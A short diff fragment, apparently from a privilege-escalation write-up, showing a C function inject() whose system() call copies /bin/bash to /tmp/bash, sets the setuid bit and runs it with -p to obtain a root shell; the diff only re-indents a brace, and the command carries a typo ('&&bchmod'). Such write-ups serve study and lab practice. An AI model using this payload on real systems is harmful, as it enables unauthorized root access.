@@ -53,7 +53,7 @@
 
       void inject() {
         system("cp /bin/bash /tmp/bash &&bchmod +s /tmp/bash && /tmp/bash -p");
-}  
+      }
    
    ## Complie
 
